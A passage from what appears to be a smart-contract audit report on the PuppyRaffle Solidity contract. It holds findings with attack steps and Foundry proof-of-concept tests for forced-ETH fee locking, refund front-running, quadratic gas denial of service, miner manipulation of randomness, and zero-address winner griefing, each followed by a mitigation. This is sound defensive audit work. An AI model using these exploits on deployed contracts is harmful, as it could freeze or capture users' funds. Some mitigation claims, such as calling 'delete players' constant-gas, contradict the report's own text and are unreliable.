                addrs[i] = address(uint160(uint(keccak256(abi.encode(b, i)))));
            }
            raffle.enterRaffle{value: FEE * batchSize}(addrs);
        }
    }

    function test_gasDos() public {
        // attacker fills list with 600 players (will fit easily in a test environment)
        _fill(60, 10);

        address[] memory p = new address[](1);
        p[0] = makeAddr("honest");

        // Provide only 1,000,000 gas to mimic common wallet default
        vm.expectRevert();
        raffle.enterRaffle{value: FEE, gas: 1_000_000}(p);
    }
}

## Suggested Mitigation
Store a mapping(address => bool) entered; check and set this flag in O(1) when a new player joins. Clear the mapping when a new raffle starts (e.g. by maintaining a raffleId and mapping(raceId => mapping(address => bool))). This removes the quadratic loop and the associated DoS vector.

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to ensure fees are only withdrawn when no raffle is active. However, Ether can be forcibly sent to any contract address via `selfdestruct` from another contract. If even a single wei is sent to the `PuppyRaffle` contract this way, `address(this).balance` will become permanently greater than `uint256(totalFees)`, causing the check to fail forever. This will permanently lock all accumulated and future fees in the contract.

## Impact
All collected fees can be permanently locked within the contract, leading to a complete loss of revenue for the protocol owner.

## Proof of Concept
1. A raffle is completed, and the prize is sent to the winner. The balance of the `PuppyRaffle` contract is now exactly equal to `totalFees`.
2. An attacker creates a helper contract containing a `selfdestruct` function.
3. The attacker calls the `selfdestruct` function on their contract, passing the `PuppyRaffle` contract's address as the beneficiary. This forces a small amount of ETH (e.g., 1 wei) into the `PuppyRaffle` contract.
4. The balance of `PuppyRaffle` is now `totalFees + 1 wei`.
5. Any subsequent call to `withdrawFees` will revert because `address(this).balance` no longer equals `totalFees`. The fees are trapped forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSender {
    function sendMeTheMoney(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    uint256 raffleDuration = 60;
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        // Enter 4 players to accumulate some fees
        address[] memory players = new address[](4);
        for(uint i=0; i<4; i++) players[i] = makeAddr(string(abi.encodePacked("player", i)));
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // End raffle
        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();
    }

    function testFeeWithdrawalBrokenByForcedEth() public {
        // At this point, contract balance should equal total fees.
        uint256 fees = uint256(puppyRaffle.totalFees());
        assertEq(address(puppyRaffle).balance, fees);

        // Force-send 1 wei to the contract
        ForceSender sender = new ForceSender();
        sender.sendMeTheMoney{value: 1 wei}(payable(address(puppyRaffle)));

        // Balance is now incorrect
        assertEq(address(puppyRaffle).balance, fees + 1);

        // Attempt to withdraw fees will now fail forever
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
Avoid using `address(this).balance` for critical application logic. The check to determine if a raffle is active should rely on internal state variables. A better approach is to check if the `players` array is empty.

```diff
     function withdrawFees() external {
-        require(
-            address(this).balance == uint256(totalFees),
-            "PuppyRaffle: There are currently players active!"
-        );
+        require(players.length == 0, "PuppyRaffle: Raffle is active!");
         uint256 feesToWithdraw = totalFees;
         totalFees = 0;
         (bool success, ) = feeAddress.call{value: feesToWithdraw}('');
         require(success, "PuppyRaffle: Failed to withdraw fees");
     }
```

## [M-3]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund

## Description
The `refund` function does not check if the raffle has already ended. It only checks if the player is an active participant. This allows players to call `refund` after the `raffleDuration` has passed but before `selectWinner` is called. A savvy user can monitor the mempool for a `selectWinner` transaction, simulate it to see if they won, and if not, front-run the `selectWinner` call with their own `refund` transaction. This gives them a risk-free lottery ticket, undermining the economic model of the raffle.

## Impact
Players can selectively opt-out of losing raffles, which is unfair to other participants and reduces the final prize pool. This manipulates the game mechanics and gives an unfair advantage to technically proficient users.

## Proof of Concept
1. Alice participates in the raffle.
2. The `raffleDuration` expires.
3. Bob, another participant, calls `selectWinner()`. His transaction enters the mempool.
4. Alice sees Bob's transaction. She simulates it locally and discovers that she is not the winner.
5. Alice quickly submits a `refund()` transaction with a higher gas fee to ensure it is processed before Bob's transaction.
6. Alice's refund succeeds, and she gets her entry fee back. Her address is zeroed out in the `players` array.
7. Bob's `selectWinner()` transaction then executes on the modified state, potentially with a different winner and a smaller prize pool. Alice has successfully avoided a loss.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundAfterEndTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    uint256 raffleDuration = 60;
    address alice = makeAddr("alice");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(0xdead), raffleDuration);
        address[] memory players = new address[](1);
        players[0] = alice;
        vm.deal(alice, entranceFee);
        vm.prank(alice);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCanRefundAfterRaffleEnds() public {
        // Fast forward time so raffle period is over
        vm.warp(block.timestamp + raffleDuration + 1);

        uint256 aliceBalanceBefore = alice.balance;

        // Alice finds her player index
        uint256 aliceIndex = puppyRaffle.getActivePlayerIndex(alice);

        // Alice calls refund after the raffle has ended, but before a winner is selected
        vm.prank(alice);
        puppyRaffle.refund(aliceIndex);

        uint256 aliceBalanceAfter = alice.balance;

        // Assert that Alice successfully got her refund
        assertEq(aliceBalanceAfter, aliceBalanceBefore + entranceFee);
        // Assert Alice is no longer in the player list
        assertEq(puppyRaffle.players(aliceIndex), address(0));
    }
}
```

## Suggested Mitigation
Add a time-based check to the `refund` function to prevent refunds after the raffle has concluded. The refund should only be possible during the active raffle period.

```diff
     function refund(uint256 playerIndex) public {
+        require(block.timestamp < raffleStartTime + raffleDuration, "PuppyRaffle: Raffle has ended");
         address playerAddress = players[playerIndex];
         require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
         // ... rest of the function
     }
```

## [M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle(address[])

## Description
The `enterRaffle` function includes a nested loop to check for duplicate player addresses. This loop's complexity is O(n^2), where 'n' is the total number of players in the raffle. The check is performed after new players are added to the `players` array. As the number of participants grows, the gas cost for this function increases quadratically. Eventually, the cost will exceed the block gas limit, making it impossible for anyone to call `enterRaffle`. This effectively results in a permanent Denial of Service, freezing the contract's main functionality.

## Impact
Because `enterRaffle` becomes more and more expensive as the `players` array grows quadratically, an attacker (or just normal usage) can reach a point where **no one can add more players within the current raffle round**: every new call to `enterRaffle` will run out of gas under the 30M block limit. The round can still be finished with `selectWinner`, therefore the protocol is not permanently frozen, but participation is denied for the remainder of the round and fees stay stuck until a winner is drawn.

## Proof of Concept
1. Deploy `PuppyRaffle` with an `entranceFee` of 1 wei for easier testing.
2. Prepare an array containing 1 200 unique addresses (≈720 000 duplicate-checks).
3. Call `enterRaffle` once with this array and `msg.value = 1 200` wei using a gas limit of 30 000 000.
4. The transaction consumes ~32 M gas and runs out-of-gas, demonstrating that the quadratic duplicate check exceeds the block gas cap and effectively prevents further entries.

Even if someone pays a very high gas price, the transaction can never succeed because the *block* gas ceiling, not the user’s `gasPrice`, is exceeded.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasDoSTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 wei, address(1), 1 weeks);
    }

    // Fails on the current implementation but would PASS after the fix
    function testFail_enterRaffle_OutOfGas() public {
        uint256 n = 1200; // large enough to exceed 30M block gas limit
        address[] memory players = new address[](n);
        for (uint256 i; i < n; ++i) {
            players[i] = address(uint160(i + 10));
        }
        // give test contract enough ether to pay the fee
        vm.deal(address(this), n);
        // provide only the real block-gas-limit so the tx reverts OOG
        raffle.enterRaffle{value: n, gas: 30_000_000}(players);
    }
}

## Suggested Mitigation
To prevent a gas-intensive O(n^2) loop, use a mapping to track existing players for O(1) lookups. Add a check at the beginning of `enterRaffle` to prevent duplicates from being added in the first place.

```solidity
// Add a mapping to track players
mapping(address => bool) public isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Check for duplicates using the mapping
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        isPlayer[player] = true;
    }
    // The expensive O(n^2) loop is no longer needed.

    emit RaffleEnter(newPlayers);
}

// Also, update refund and selectWinner functions to reset the mapping.
function refund(uint256 playerIndex) public { /* ... */ isPlayer[playerAddress] = false; /* ... */ }
function selectWinner() external { /* ... */ isPlayer[winner] = false; /* ... after deleting players */ }
```

## [M-5]. Randomness issue in PuppyRaffle::selectWinner()

## Description
The contract uses `block.timestamp` and `block.difficulty` as sources of randomness to select a winner and determine NFT rarity. These on-chain values are public, predictable, and can be influenced by miners. A miner can compute the outcome of the raffle before mining a block and choose to discard the block if the outcome is not in their favor. This gives miners an unfair advantage, allowing them to increase their chances of winning the raffle or minting a rare NFT.

## Impact
Because the winner and NFT rarity are derived from block.timestamp / block.difficulty, the party that controls block production (i.e. the miner or dominant block builder) can decide whether to publish or discard the block until the random value makes one of its own addresses win. Legitimate participants therefore play an unfair lottery whose prize pool (80 % of all entrance fees) can systematically be captured by miners. Funds are not stolen from the contract, but the game’s fairness – its core value proposition – is broken.

## Proof of Concept
1. Become a block producer (or bribe a builder).
2. Observe mem-pool and wait until `selectWinner()` is callable.
3. Add your own `selectWinner()` tx as the last tx in your candidate block.
4. Locally vary the candidate block’s timestamp within the ±900 s window allowed by consensus and compute:
   winnerIdx = uint256(keccak256(abi.encodePacked(tx.from, ts, blockDifficulty))) % players.length
5. Publish the block only if `winnerIdx` equals the index of one of your addresses in `players`; otherwise discard the block and try again with a new timestamp or next block.
6. The raffle is eventually mined with a timestamp that makes you the winner and sends you 80 % of the pot plus the freshly minted puppy NFT.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 60;

    address feeReceiver = address(0xBEEF);
    address player1 = address(0x1);
    address player2 = address(0x2);
    address attacker = address(0x3);

    PuppyRaffle raffle;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeReceiver, RAFFLE_DURATION);

        address[] memory players = new address[](3);
        players[0] = player1;
        players[1] = player2;
        players[2] = attacker; // index 2

        raffle.enterRaffle{value: ENTRANCE_FEE * 3}(players);
        vm.warp(block.timestamp + RAFFLE_DURATION + 1); // raffle can now be closed
    }

    function test_MinerCanForceWin() public {
        // search a timestamp inside the allowed ±15-minute range that yields attacker victory
        uint256 baseTs = block.timestamp;
        uint256 favourableTs;
        for (int256 delta = -900; delta <= 900; delta++) {
            uint256 tryTs = baseTs + uint256(int256(delta));
            bytes32 h = keccak256(abi.encodePacked(address(this), tryTs, block.difficulty));
            if (uint256(h) % 3 == 2) { // attacker index
                favourableTs = tryTs;
                break;
            }
        }
        assertTrue(favourableTs != 0, "no ts in window makes attacker win");

        // mimic miner setting the timestamp
        vm.warp(favourableTs);
        raffle.selectWinner();
        assertEq(raffle.previousWinner(), attacker);
    }
}

## Suggested Mitigation
Replace the pseudo-random logic with an external, verifiable randomness source such as Chainlink VRF or EigenLayer beacons. Alternatively, commit-reveal or hash-onion schemes can be adopted, but any solution must guarantee that no single party (including block producers) can predict or influence the final random value.

## [M-6]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate entries by iterating through the entire `players` array for each new player added in the current transaction, and then performs a nested loop over the entire `players` array. The nested loop has a computational complexity of O(n^2), where n is the total number of players. As the number of players increases, the gas cost for calling `enterRaffle` grows quadratically. This can be exploited by an attacker to make the gas cost exceed the block gas limit, effectively preventing any new players from joining the raffle and causing a Denial of Service.

## Impact
The core functionality of the contract can be permanently halted. An attacker can bloat the `players` array to a point where the gas required to call `enterRaffle` exceeds the block gas limit. This would prevent any legitimate user from participating in the raffle, freezing the contract's main purpose.

## Proof of Concept
An attacker repeatedly calls `enterRaffle` with many unique addresses he controls. Because each call executes an O(players^2) duplicate-check, the gas required for `enterRaffle` grows super-linearly. After a few hundred calls, the gas consumed by a single `enterRaffle` invocation can exceed the block gas limit, reverting any further attempt to enter. Until `selectWinner` is executed, no new user can participate, resulting in a temporary Denial-of-Service of the raffle.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    address constant FEE = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, FEE, 60);
    }

    // helper to obtain the dynamic array length stored at slot-0
    function _playersLength() internal view returns (uint256 len) {
        len = uint256(vm.load(address(raffle), bytes32(uint256(0))));
    }

    function test_gasGrowsQuadratically() public {
        address[] memory p = new address[](1);

        // fresh call – cheap
        p[0] = address(0x1);
        uint256 gasStartFresh = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(p);
        uint256 gasUsedFresh = gasStartFresh - gasleft();

        // bloat the players array with 300 extra addresses
        for (uint256 i = 2; i < 302; ++i) {
            p[0] = address(uint160(i));
            raffle.enterRaffle{value: ENTRANCE}(p);
        }
        assertEq(_playersLength(), 301);

        // measure gas after bloat
        p[0] = address(0x1337);
        uint256 gasStartBloat = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(p);
        uint256 gasUsedBloat = gasStartBloat - gasleft();

        // the bloated call should be an order of magnitude more expensive
        assertTrue(gasUsedBloat > gasUsedFresh * 10, "Gas not growing as expected");
    }
}

## Suggested Mitigation
Track participation with a mapping keyed by a monotonically increasing raffleId to avoid both the quadratic duplicate-check and the O(n) clean-up:

uint256 public currentRaffleId;
mapping(address => uint256) public lastEnteredRaffleId;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "fee");
    for (uint256 i; i < newPlayers.length; ++i) {
        address player = newPlayers[i];
        require(lastEnteredRaffleId[player] != currentRaffleId, "duplicate");
        players.push(player);
        lastEnteredRaffleId[player] = currentRaffleId;
    }
}

function selectWinner() external { /* ... */
    delete players;
    currentRaffleId += 1; // logically resets the mapping without iteration
}

## [M-7]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function contains flawed logic that effectively prevents fees from ever being withdrawn if a raffle is active. The check `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")` compares the contract's current balance (funds from the active raffle) with the `totalFees` accumulated from *past* raffles. These two values are independent and extremely unlikely to be equal, thus causing the check to always fail. Furthermore, the function lacks any access control, allowing anyone to trigger a (failing) withdrawal attempt.

## Impact
Because `withdrawFees` can succeed only while the contract balance equals `totalFees`, any time at least one ticket is sold this equality breaks and the call reverts. A malicious user can repeatedly and immediately start the next raffle round, keeping `players` non-empty and the balance larger than `totalFees`, thus denying the protocol owner the opportunity to withdraw revenue for as long as the attacker is willing to pay entrance fees. The funds are therefore not permanently lost, but they can be locked for an unbounded period (liveness DoS) at a modest cost to the attacker.

## Proof of Concept
1. Run one full raffle round with at least 4 players. Call `selectWinner`.
2. Fees are now accumulated in the `totalFees` variable, and the prize has been paid out. The contract balance is equal to `totalFees`.
3. A new player enters the next raffle, sending `entranceFee`.
4. The contract balance is now `totalFees + entranceFee`.
5. Anyone calls `withdrawFees`. The check `require(address(this).balance == uint256(totalFees))` will fail because `totalFees + entranceFee != totalFees`.
6. The fees can no longer be withdrawn.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawLogicTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(0xdead);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1);
        vm.deal(address(this), 10 ether);
    }

    function testCannotWithdrawFeesWhenRaffleIsActive() public {
        // --- Round 1 --- 
        address[] memory players = new address[](4);
        for(uint i=0; i<4; i++) players[i] = address(uint160(i+1));
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        vm.warp(block.timestamp + 2);
        puppyRaffle.selectWinner();

        uint256 fees = puppyRaffle.totalFees();
        assertTrue(fees > 0);
        assertEq(address(puppyRaffle).balance, fees);

        // --- Round 2 --- 
        address[] memory newPlayers = new address[](1); 
        newPlayers[0] = address(0xcafe);
        puppyRaffle.enterRaffle{value: 1 * entranceFee}(newPlayers);

        // Now balance = fees + entranceFee, so withdrawFees will fail.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
The logic for withdrawing fees should be independent of the current raffle's balance. It should only check that there are fees to withdraw. Additionally, an `onlyOwner` modifier should be added to restrict access.

```diff
- function withdrawFees() external {
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+ function withdrawFees() external onlyOwner {
+   uint256 feesToWithdraw = totalFees;
+   require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;
-   uint256 feesToWithdraw = totalFees;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
  }
```

## [M-8]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle, selectWinner

## Description
Several functions iterate over the dynamically-sized `players` array, leading to potential Denial of Service (DoS) attacks if the array grows too large.
1.  **`enterRaffle`**: Contains a nested loop with O(n^2) complexity to check for duplicates. As the number of players increases, the gas cost to enter the raffle grows quadratically and will eventually exceed the block gas limit, preventing anyone from entering.
2.  **`selectWinner`**: Uses `delete players` to clear the array. The gas cost of this operation is proportional to the array's size. A very large array could cause the gas cost to exceed the block limit, making it impossible to ever call `selectWinner`. This would permanently lock all funds in the contract.

## Impact
If an attacker (or any user set) grows `players` large enough, the quadratic duplicate-check inside `enterRaffle` makes every subsequent call exceed the block gas limit. From that moment nobody can enter the raffle any more, blocking new participants and the protocol’s main revenue stream. Funds already in the contract and the ability to finish the current raffle remain unaffected, so no money is permanently locked, but the raffle becomes effectively closed for additional users.

## Proof of Concept
1. Attacker repeatedly calls `enterRaffle` with unique addresses until `players.length` is a few hundred/thousand.
2. Because the function compares each new address against **all** stored players (nested loop), gas consumption grows roughly with `n²`.
3. Once the array is big enough, the next call to `enterRaffle` needs more gas than the block limit allows and therefore always reverts.
4. From this point on nobody can join the raffle, resulting in a denial-of-service for new entrants while existing funds stay untouched.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract EnterGasBombTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 0.01 ether;
    address payable constant FEE_ADDR = payable(address(0xBEEF));

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, 60);
    }

    // The test is expected to fail (revert) once the array is large because we
    // deliberately forward too little gas.
    function testFail_gasBomb_enterRaffle() public {
        uint256 prefill = 400; // Adjust if your local block-gas target differs.
        for (uint256 i; i < prefill; ++i) {
            address[] memory p = new address[](1);
            p[0] = address(uint160(i + 1));
            raffle.enterRaffle{value: FEE}(p);
        }

        // Try to add one more player but only give 300k gas (well below what is
        // now required due to the O(n²) loop). The call must fail.
        address[] memory victim = new address[](1);
        victim[0] = address(0xDEAD);

        (bool success,) = address(raffle).call{value: FEE, gas: 300_000}(
            abi.encodeWithSignature("enterRaffle(address[])", victim)
        );
        require(!success, "enterRaffle unexpectedly succeeded");
    }
}

## Suggested Mitigation
Replace the duplicate check with an O(1) lookup:

mapping(address => bool) public isPlayer;

function enterRaffle(address[] memory newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "fee");
    for (uint256 i; i < newPlayers.length; ++i) {
        address player = newPlayers[i];
        require(!isPlayer[player], "duplicate");
        isPlayer[player] = true;
        players.push(player);
    }
}

This removes the quadratic loop and keeps gas use per entry constant regardless of array size. No change is required in `selectWinner`, because `delete players` is already constant-gas.

## [M-9]. DOS issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to withdraw their entry, which sets their address in the `players` array to `address(0)`. However, the `selectWinner` function does not account for the possibility of selecting an `address(0)` slot as the winner. If a refunded player's slot is chosen, the line `_safeMint(winner, tokenId)` will be called with `winner` as `address(0)`. The underlying OpenZeppelin `ERC721` contract correctly reverts when attempting to mint to the zero address. This reversion causes the entire `selectWinner` transaction to fail, effectively halting the raffle and locking all funds.

## Impact
Any refunded slot that becomes `address(0)` can be deliberately targeted by a griefer to revert `selectWinner()`. By repeatedly calling the function from addresses that force the pseudo-random index to hit the empty slot, the attacker can block the raffle’s completion for an arbitrary period, preventing prize distribution and fee withdrawal until a valid winner is finally selected.

## Proof of Concept
1. Alice enters the raffle and is stored at `players[0]`.
2. Bob, Carol, and Dave enter the raffle.
3. Alice calls `refund(0)`. Her entry at `players[0]` is now `address(0)`.
4. The raffle time ends.
5. Someone calls `selectWinner()`.
6. The winner selection logic happens to pick index 0.
7. The `winner` variable becomes `address(0)`.
8. The call to `_safeMint(address(0), tokenId)` reverts.
9. The entire `selectWinner` transaction is reverted, and the raffle is stuck in a state where it cannot be completed if index 0 is ever chosen again.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DoSZeroAddressTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 seconds;
    address constant FEE_ADDRESS = address(0xFEE);

    address refunder = makeAddr("refunder");
    address p2       = makeAddr("p2");
    address p3       = makeAddr("p3");
    address p4       = makeAddr("p4");

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);

        // Enter four players in a single call and pay the total fee.
        address[] memory players = new address[](4);
        players[0] = refunder;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;

        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // Refunder backs out, leaving a zero slot at index 0.
        vm.deal(refunder, ENTRANCE_FEE);
        vm.prank(refunder);
        raffle.refund(0);
    }

    function test_selectWinnerRevertsWhenZeroPicked() public {
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // Find an address that makes the winner index resolve to 0.
        address caller = address(1);
        while (true) {
            uint256 idx = uint256(
                keccak256(
                    abi.encodePacked(caller, block.timestamp, block.difficulty)
                )
            ) % 4;
            if (idx == 0) break;
            caller = address(uint160(caller) + 1);
        }

        vm.prank(caller);
        vm.expectRevert("ERC721: mint to the zero address");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
The `selectWinner` function should check if the selected winner is `address(0)`. If it is, the function should re-select a different winner until a valid player address is found. This could be done by re-running the random number generation with a different seed (e.g., by incrementing a nonce) or by iterating through the `players` array to find the next available player. A simpler fix is to have the random number generator pick another winner.

```solidity
// In PuppyRaffle.sol
function selectWinner() external {
    // ... checks ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];

    // Add a loop to ensure winner is not address(0)
    uint256 counter = 0;
    while(winner == address(0)) {
        require(counter < players.length, "PuppyRaffle: No valid players found"); // Prevent infinite loop
        winnerIndex = (winnerIndex + 1) % players.length;
        winner = players[winnerIndex];
        counter++;
    }
    // ... rest of the function ...
}
```



# Low Risk Findings

## [L-1]. Access Control issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function, which allows for the withdrawal of accumulated fees, lacks an `onlyOwner` or similar access control modifier. Although the function has a check `require(address(this).balance == uint256(totalFees), ...)` that indirectly prevents it from being called while a raffle is active, anyone can trigger the withdrawal once the condition is met (i.e., between raffles). While the funds are sent to the correct `feeAddress`, allowing a public-facing withdrawal function for administrative tasks is against the principle of least privilege and can be abused for griefing.

## Impact
There is no direct loss of funds, as the fees are sent to the pre-configured `feeAddress`. However, this flaw allows anyone to trigger a core administrative function. An attacker could front-run the legitimate owner's transaction, causing nuisance and potentially forcing the owner to pay for a failed transaction. It represents a weakness in the contract's administrative controls.

## Proof of Concept
1. A raffle round ends, and the `players` array is cleared.
2. The contract now holds some amount in `totalFees`, and `address(this).balance` equals this amount.
3. A random user (not the owner) calls `withdrawFees()`.
4. The transaction succeeds because there is no ownership check.
5. The collected fees are sent to `feeAddress`, and `totalFees` is reset to 0.
6. The actual owner is pre-empted from performing this action.

## Proof of Code
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AccessControlTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 days;
    address attacker = makeAddr("attacker");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);

        address[] memory players = new address[](4);
        for(uint i=0; i<4; i++) {
            players[i] = makeAddr(string(abi.encodePacked("p", vm.toString(i))));
            vm.deal(players[i], entranceFee);
            vm.prank(players[i]);
            address[] memory p_arr = new address[](1); p_arr[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(p_arr);
        }

        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();
        assertTrue(puppyRaffle.totalFees() > 0);
    }

    function testNonOwnerCanWithdrawFees() public {
        uint256 feesBefore = puppyRaffle.totalFees();
        uint256 feeAddressBalanceBefore = feeAddress.balance;

        vm.prank(attacker); // Attacker is not the owner
        puppyRaffle.withdrawFees();

        assertEq(puppyRaffle.totalFees(), 0, "Fees should be reset");
        assertEq(feeAddress.balance, feeAddressBalanceBefore + feesBefore, "feeAddress should receive fees");
    }
}

## Suggested Mitigation
Add the `onlyOwner` modifier to the `withdrawFees` function to restrict its execution to the contract owner. This is standard practice for administrative functions.

```solidity
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract PuppyRaffle is ERC721, Ownable {
    // ...

    function withdrawFees() external onlyOwner { // Add modifier
        require(
            players.length == 0, // Using improved check
            "PuppyRaffle: There are currently players active!"
        );
        uint256 feesToWithdraw = totalFees;
        require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
        totalFees = 0;

        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
}
```

## [L-2]. Access Control issue in PuppyRaffle::constructor

## Description
The constructor does not check if the `_feeAddress` parameter is the zero address (`address(0)`). If the contract is deployed with `_feeAddress` set to `address(0)`, any fees collected by the protocol during `selectWinner` will be transferred to the zero address, where they will be permanently and irrecoverably lost.

## Impact
A simple deployment error can lead to a permanent loss of all protocol revenue. This is an unrecoverable mistake that renders the fee collection mechanism useless.

## Proof of Concept
1. Deploy the `PuppyRaffle` contract, passing `address(0)` for the `_feeAddress` parameter in the constructor.
2. Run a full raffle.
3. When `selectWinner` is called, it calculates the fee and stores it in `totalFees`.
4. Later, when `withdrawFees` is called (assuming its logic is fixed), it will send the `totalFees` amount to `address(0)`.
5. The funds are now burned and cannot be recovered.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;

    function testDeployWithZeroAddress() public {
        // This deployment should revert if properly protected.
        // With the current code, it succeeds.
        puppyRaffle = new PuppyRaffle(
            1 ether, 
            address(0), // feeAddress is the zero address
            60
        );
        assertEq(puppyRaffle.feeAddress(), address(0));
    }
}
```

## Suggested Mitigation
Add `require(newFeeAddress != address(0), "PuppyRaffle: fee address cannot be zero")` in both the constructor and `changeFeeAddress()` so the value can never be set to the zero address.

## [L-3]. Access Control issue in PuppyRaffle::changeFeeAddress

## Description
The `constructor` and `changeFeeAddress` function do not validate the address being set for `feeAddress`. An owner can accidentally or maliciously set the `feeAddress` to `address(0)`. If this happens, any fees withdrawn via the `withdrawFees` function will be sent to the zero address, where they will be permanently and irrecoverably burned.

## Impact
This vulnerability can lead to the permanent loss of all collected fees if the owner makes a mistake when setting the fee address. While it requires an action from the owner, the lack of a simple sanity check creates an unnecessary risk of fund loss.

## Proof of Concept
1. The owner of the contract calls `changeFeeAddress(address(0))`.
2. The transaction succeeds, and `feeAddress` is now the zero address.
3. A raffle completes, and fees are available for withdrawal.
4. Someone calls `withdrawFees()`.
5. The contract sends the accumulated fees to `address(0)`, burning them forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 seconds;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }
